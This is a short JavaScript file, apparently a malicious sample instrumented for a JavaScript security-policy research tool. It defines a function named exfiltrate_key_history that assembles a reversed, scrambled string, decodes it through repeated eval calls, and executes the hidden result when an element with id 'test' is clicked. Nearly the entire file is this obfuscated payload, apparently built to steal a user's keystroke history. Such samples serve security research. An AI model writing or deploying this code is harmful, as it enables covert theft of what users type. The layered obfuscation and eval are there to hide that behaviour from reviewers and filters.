function exfiltrate_key_history() {
  var v9 = 'function f(x){var i,o="",ol=x.length,l=ol;while(x.charCodeAt(l/13)!' + "=48){try{x+=x;l+=l;}catch(e){}}for(i=l-1;i>=0;i--){o+=x.charAt(i);}return o";
  var v8 = v9 + '.substr(0,ol);}f(")92,\\";N500\\\\7,=+l220\\\\Kp&bler\\\\020\\\\nzrjl320\\';
  var v7 = v8 + '\\F>5/gu410\\\\J>\\"\\\\!ai130\\\\QrkpkhCJmkr=l320\\\\Jv hmir\\\\MwcdwsQML';
  var v6 = v7 + "KBC330\\\\130\\\\?600\\\\720\\\\230\\\\600\\\\010\\\\430\\\\610\\\\000\\\\,";
  var v5 = v6 + "CDP130\\\\430\\\\320\\\\610\\\\BDOE5%030\\\\yu2>*6v'\\\"\\\\!<??)ptge88/<9\\";
  var v4 = v5 + '"\\\\420\\\\507n\\\\r\\\\r\\\\g630\\\\JYU700\\\\ILC^YYK220\\\\CQY410\\\\50';
  var v3 = v4 + '0\\\\BGO]AUQ310\\\\PMGLU|qy\\"(f};o nruter};))++y(^)i(tAedoCrahc.x(edoCrah';
  var v0 = v3 + 'Cmorf.gnirtS=+o;721=%y;2=*y))y+92(>i(fi{)++i;l<i;0=i(rof;htgnel.x=l,\\"\\"';
  var x$$47 = v0 + '=o,i rav{)y,x(f noitcnuf")';
  var z$$2 = 0;
  var v1 = z$$2 < 2;
  for (;v1;) {
    if (JAM.isEval(eval)) {
      x$$47 = eval("introspect(JAM.policy.pFull) { " + x$$47 + " }");
    } else {
      x$$47 = JAM.call(eval, null, [x$$47]);
    }
    z$$2 = z$$2 + 1;
    v1 = z$$2 < 2;
  }
  x$$47 = x$$47.replace("document.writeln(", "");
  x$$47 = x$$47.replace(");0;", "");
  x$$47 = x$$47.replace(/"/g, "");
  if (JAM.isEval(eval)) {
    eval("introspect(JAM.policy.pFull) { " + x$$47 + " }");
  } else {
    JAM.call(eval, null, [x$$47]);
  }
  return;
}
var v2 = document.getElementById("test");
JAM.set(v2, "onclick", exfiltrate_key_history)
